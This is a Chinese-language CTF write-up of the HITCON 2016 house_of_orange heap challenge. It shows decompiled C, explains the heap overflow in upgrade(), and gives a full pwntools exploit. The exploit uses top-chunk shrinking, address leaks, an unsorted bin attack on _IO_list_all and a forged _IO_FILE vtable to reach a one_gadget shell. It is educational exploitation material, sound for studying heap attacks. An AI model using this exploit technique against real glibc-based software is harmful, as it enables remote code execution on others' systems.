# HITCON2016 house_of_orange

## Author: Wenhuo



&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>非常经典的house of orange的一个入门题，学习这种利用方法基本都以做这题开始，这也是这种利用技巧第一次出现在比赛时的题，这种利用技巧便以这题house of orange命名。这题就是利用house of orange得到unsortedbin，然后使用unsortedbin attack攻击\_IO_FILE系统，因为是glibc2.23下的\_IO_FILE,所以可以直接伪造vtable劫持流程。要使用house of orange的前提条件是：</font></br>

- 存在堆溢出，可以修改top chunk大小
- 存在unsortedbin attack
- 可以泄漏libc和堆地址

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以可以看到利用条件还是挺苛刻的，一般在无法使用free函数的情况下使用house of orange进行攻击，先看看shellfish的[demo](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c)。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>然后我们就看这个程序如何被逐步击破吧，如果过程中还有不懂的同样可以看我的how2pwn里的demo学习相关前置知识或者具体实现。</font></br>

**main**

```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int choose; // eax

  sub_1218();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choose = get_num();
      if ( choose != 2 )
        break;
      show();
    }
    if ( choose > 2 )
    {
      if ( choose == 3 )
      {
        upgrade();
      }
      else
      {
        if ( choose == 4 )
        {
          puts("give up");
          exit(0);
        }
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( choose != 1 )
        goto LABEL_14;
      build();
    }
  }
}
```



**build**

```C

int build()
{
  unsigned int size; // [rsp+8h] [rbp-18h]
  signed int size_4; // [rsp+Ch] [rbp-14h]
  void *block; // [rsp+10h] [rbp-10h]
  _DWORD *orange; // [rsp+18h] [rbp-8h]

  if ( alloc_times > 3u )
  {
    puts("Too many house");
    exit(1);
  }
  block = malloc(0x10uLL);
  printf("Length of name :");
  size = get_num();
  if ( size > 0x1000 )
    size = 4096;
  *((_QWORD *)block + 1) = malloc(size);
  if ( !*((_QWORD *)block + 1) )
  {
    puts("Malloc error !!!");
    exit(1);
  }
  printf("Name :");
  get_read(*((void **)block + 1), size);
  orange = calloc(1uLL, 8uLL);
  printf("Price of Orange:", 8LL);
  *orange = get_num();
  print_color();
  printf("Color of Orange:");
  size_4 = get_num();
  if ( size_4 != 0xDDAA && (size_4 <= 0 || size_4 > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( size_4 == 0xDDAA )
    orange[1] = 0xDDAA;
  else
    orange[1] = size_4 + 30;
  *(_QWORD *)block = orange;
  cur_block = block;
  ++alloc_times;
  return puts("Finish");
}
```



**upgrade**

```C
int upgrade()
{
  _DWORD *price_ptr; // rbx
  unsigned int size; // [rsp+8h] [rbp-18h]
  signed int color; // [rsp+Ch] [rbp-14h]

  if ( upgrade_times > 2u )
    return puts("You can't upgrade more");
  if ( !cur_block )
    return puts("No such house !");
  printf("Length of name :");
  size = get_num();
  if ( size > 0x1000 )
    size = 4096;
  printf("Name:");
  get_read((void *)cur_block[1], size);
  printf("Price of Orange: ", size);
  price_ptr = (_DWORD *)*cur_block;
  *price_ptr = get_num();
  print_color();
  printf("Color of Orange: ");
  color = get_num();
  if ( color != 0xDDAA && (color <= 0 || color > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( color == 0xDDAA )
    *(_DWORD *)(*cur_block + 4LL) = 0xDDAA;
  else
    *(_DWORD *)(*cur_block + 4LL) = color + 30;
  ++upgrade_times;
  return puts("Finish");
}
```



**show**

```C
int show()
{
  int v0; // eax
  int result; // eax
  int v2; // eax

  if ( !cur_block )
    return puts("No such house !");
  if ( *(_DWORD *)(*cur_block + 4LL) == 0xDDAA )
  {
    printf("Name of house : %s\n", cur_block[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*cur_block);
    v0 = rand();
    result = printf("\x1B[01;38;5;214m%s\x1B[0m\n", color[v0 % 8]);
  }
  else
  {
    if ( *(_DWORD *)(*cur_block + 4LL) <= 30 || *(_DWORD *)(*cur_block + 4LL) > 37 )
    {
      puts("Color corruption!");
      exit(1);
    }
    printf("Name of house : %s\n", cur_block[1]);
    printf("Price of orange : %d\n", *(unsigned int *)*cur_block);
    v2 = rand();
    result = printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*cur_block + 4LL), color[v2 % 8]);
  }
  return result;
}
```



&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>分析程序后可以发现在upgrade的时候存在明显的堆溢出，最大可以编辑0x1000大小而且不管原来的堆有多大，这就可以直接编辑到top chunk了，并为后续利用unsortedbin attack提供了条件。所以我们先利用house of orange泄漏地址：</font></br>



```python
from pwn import *

p=process('./houseoforange')
elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level=1
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#one_gadget=0x45216
#one_gadget=0x4526A
#one_gadget=0xf02a4
one_gadget=0xf1147
IO_list_all=elf.symbols['_IO_list_all']

sd=lambda x: p.send(x)
sl=lambda x: p.sendline(x)
rv=lambda x: p.recvuntil(x)
sa=lambda a,x: p.sendafter(a,x)
sla=lambda a,x: p.sendlineafter(a,x)

menu='Your choice : '

def add(size,content=''):
    sla(menu,'1')
    sla('Length of name :',str(size))
    sla('Name :',content)
    sla('Price of Orange:','2')
    sla('Color of Orange:',str(0xddaa))

def show():
    sla(menu,'2')


def edit(size,content):
    sla(menu,'3')
    sla('Length of name :',str(size))
    sla('Name:',content)
    sla('Price of Orange:','2')
    sla('Color of Orange:',str(0xddaa))



add(0x200)

payload='a'*0x200
payload+=p64(0)+p64(0x21)
payload+=p64(0x0000ddaa00000002)
payload+=p64(0)*2
payload+=p64(0xdb1)		# shrink the size of top chunk

edit(0x1111,payload)
add(0x1000)				# house of orange!

add(0x400)				# split a largebin to leak both libc and chunk base
show()
rv('Name of house : ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c510a

edit(17,'a'*16)
show()
rv('a'*16)
chunk_base=u64(p.recv(6)+2*'\x00')-0x20a

log.info('libc  base is:'+hex(libc_base))
log.info('chunk base is:'+hex(chunk_base))

```



&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>现在我们已经成功泄漏出了两个地址了，只需要用unsortedbin attack攻击一下\_IO_FILE就完事了，我的how2pwn里有个**edit_io_list_all**有很清楚的写出了怎么完成这个过程：修改unsortedbin的bk为\_IO_list_all-0x10，为什么？看源码这一段：</font></br>

```c
3728	          /* remove from unsorted list */
3729	          unsorted_chunks (av)->bk = bck;
3730	          bck->fd = unsorted_chunks (av);
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>我们可以往任意地址写一个unsortedbin本身的地址，既然可以任意控制unsortedbin，我们可以往\_IO_list_all里写一个地址修改到自己控制的地方去，因为篡改后的_IO_FILE_plus结构有问题，所以会从**chain找到下一个FILE结构体**，在这里就是**main_arena中的0x60大小的smallbin的bk处**了（无法理解的话看main_arena的作用，还有**how2pwn中的tips**看main_arena结构），然后只要伪造这一个smallbin就相当于可以随意伪造\_IO_FILE_plus结构体了，同时包括vtable（因为libc是**glibc2.23版本的所以可以伪造vtable**，更高的就不行了），利用其结构伪造vtable（看不懂？先看\_IO_FILE的[ctfwiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fake-vtable-exploit/)），又因为malloc corruption（\_\_libc_message->abort->\_IO_flush_all_lockp->vtable）最终会调用vtable中的\_\_overflow，因此最终劫持流程到getshell。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>如果还是看不懂的话**how2pwn里的orange_shell**实现了这个过程（只是必须用**gdb在调试状态**下跑，不然地址对不上）。剩下的脚本我就直接放了：</font></br>

```python
#伪造_chain指向的下一个FILE结构体
#并伪造vtable中的__overflow为one_gadget
payload='a'*0x400
payload+=p64(0)+p64(0x21)
payload+=p64(0xddaa00000002)
payload+=p64(0)*2
payload+=p64(0x61)
payload+=p64(0)+p64(libc_base+IO_list_all-0x10)
payload+=p64(0)+p64(1)
payload+=p64(0)*21
payload+=p64(chunk_base+0x7c0)
payload+=p64(0)*3+p64(one_gadget+libc_base)

edit(0x1111,payload)
#gdb.attach(p,gdbscript='b __libc_message\nc')

#pwned！
sla(menu,'1')

p.interactive()



'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

```

